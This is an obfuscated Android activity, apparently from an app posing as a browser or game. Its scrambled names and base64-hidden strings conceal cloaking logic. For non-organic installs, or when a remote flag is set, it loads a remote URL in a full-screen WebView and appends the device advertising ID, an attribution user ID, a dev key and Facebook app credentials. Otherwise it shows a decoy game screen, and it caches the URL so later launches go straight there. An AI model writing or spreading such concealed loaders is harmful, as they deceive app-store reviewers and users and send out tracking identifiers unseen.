package com.brave.browse;

import static com.brave.browse.AppIF.vieModIF;
import static com.brave.browse.ApsIF.bgfr;
import static com.brave.browse.ApsIF.bbgd;
import static com.brave.browse.ApsIF.bfdesx;
import static com.brave.browse.ApsIF.cdsvds;
import static com.brave.browse.ApsIF.bfdwax;
import static com.brave.browse.FBIF.cdscvs;
import static com.brave.browse.FBIF.bgfs;
import static com.brave.browse.RulesIF.decodeIF;
import static com.brave.browse.WebSeIF.bgfwd;
import static com.brave.browse.WebSeIF.nnhf;
import static com.brave.browse.WebSeIF.bbfdc;
import static com.brave.browse.WebSeIF.bfds;
import static com.brave.browse.WebSeIF.dds;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.widget.Button;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;


public class IF extends AppCompatActivity {

    Button sdsa;
    public static String dd;
    public static String gg;
    private WebView webViewFullAppIF;
    private Handler dsas;
    int jj = 0;


    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.iff);
        sdsa = findViewById(R.id.button4);
        webViewFullAppIF = findViewById(R.id.webViewFullAppIF);
        vieModIF.kjl(webViewFullAppIF);
        dsas = new Handler();
        dd = getResources().getString(R.string.fbId);
        gg = getResources().getString(R.string.token);
        WebSeIF.anIf = this;

        if (vieModIF.onIn(this)){
          String savUrl = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(decodeIF("c2F2ZWRVcmw="), decodeIF("bnVsbA=="));

            if (savUrl.equals(decodeIF("bnVsbA=="))) {
                vieModIF.connN(this);
                vieModIF.fbbbif(this);


                dsas.post(new Runnable() {
                    @Override
                    public void run() {
                      if(ConIF.bgftd !="-"){
                          runOnUiThread(new Runnable() {
                              @Override
                              public void run() {
                                  dsas.post(new Runnable() {
                                      @Override
                                      public void run() {

                                          if (!bfdesx.equals("-") || !bgfs.equals("-")) {
                                              if (bfdesx.equals(decodeIF("Tm9uLW9yZ2FuaWM="))) {
                                                  String vdrds = ConIF.bgftd + bgfr;
                                                  getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decodeIF("c2F2ZWRVcmw="), vdrds).apply();
                                                  webViewFullAppIF.setVisibility(View.VISIBLE);
                                                  webViewFullAppIF.loadUrl(vdrds);
                                                  jj = 1;
                                                  Log.d("weq", "App" + vdrds);
                                              } else if (cdscvs != null) {
                                                  String tytew = ConIF.bgftd + bgfs;
                                                  getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decodeIF("c2F2ZWRVcmw="), tytew).apply();
                                                  webViewFullAppIF.setVisibility(View.VISIBLE);
                                                  webViewFullAppIF.loadUrl(tytew);
                                                  jj = 1;
                                                  Log.d("weq", "Dip" + tytew);
                                              } else {
                                                  if (ConIF.vfd.equals("0")) {
                                                      startActivity(new Intent(getApplicationContext(), IFBU.class));
                                                      finishAffinity();
                                                      jj = 1;
                                                      Log.d("weq", "game");
                                                  } else {

                                                      String bfrew = ConIF.bgftd + decodeIF("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                                                              decodeIF("Jmdvb2dsZV9hZGlkPQ==") + bfdwax +
                                                              decodeIF("JmFmX3VzZXJpZD0=") + cdsvds +
                                                              decodeIF("JmRldl9rZXk9") + bbgd +
                                                              decodeIF("JmJ1bmRsZT0=") + getPackageName() +
                                                              decodeIF("JmZiX2FwcF9pZD0=") + dd +
                                                              decodeIF("JmZiX2F0PQ==") + gg;
                                                      getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(decodeIF("c2F2ZWRVcmw="), bfrew).apply();
                                                      webViewFullAppIF.setVisibility(View.VISIBLE);
                                                      webViewFullAppIF.loadUrl(bfrew);
                                                      jj = 1;
                                                      Log.d("weq", "Orga " + bfrew);
                                                  }
                                              }

                                          } else {
                                          }

                                          if (jj != 1) {
                                              dsas.postDelayed(this::run, 1000);
                                          }

                                      }
                                  });
                              }
                          });
                      }else {
                          dsas.postDelayed(this::run,50);
                      }

                    }
                });



            }else {
                webViewFullAppIF.setVisibility(View.VISIBLE);
                webViewFullAppIF.loadUrl(savUrl);
            }
        }else {
            sdsa.setVisibility(View.VISIBLE);
        }

        sdsa.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(),IF.class));
                finishAffinity();
            }
        });

    }

    @Override
    public void onBackPressed() {
        if (webViewFullAppIF.isFocused() && webViewFullAppIF.canGoBack()) {
            webViewFullAppIF.goBack();
        }
    }

    @Override
    protected void onActivityResult(int adsr, int ngnte, @Nullable Intent bcxd) {
        if (adsr != bfds || bbfdc == null) {
            super.onActivityResult(adsr, ngnte, bcxd);
            return;
        }
        Uri[] bfdrs = null;
        if (ngnte == Activity.RESULT_OK) {
            if (bcxd == null) {
                if (nnhf != null) {
                    bfdrs = new Uri[]{Uri.parse(nnhf)};
                }
            } else {
                String hhg = bcxd.getDataString();
                if (hhg != null) {
                    bfdrs = new Uri[]{Uri.parse(hhg)};
                }
            }
        }
        bbfdc.onReceiveValue(bfdrs);
        bbfdc = null;
        if (dds == null) {
            super.onActivityResult(adsr, ngnte, bcxd);
            return;
        }
        Uri bbfdds = null;
        try {
            if (ngnte != RESULT_OK) {
                bbfdds = null;
            } else {
                bbfdds = bcxd == null ? bgfwd : bcxd.getData();
            }
        } catch (Exception e) {
        }
        dds.onReceiveValue(bbfdds);
        dds = null;
    }
}
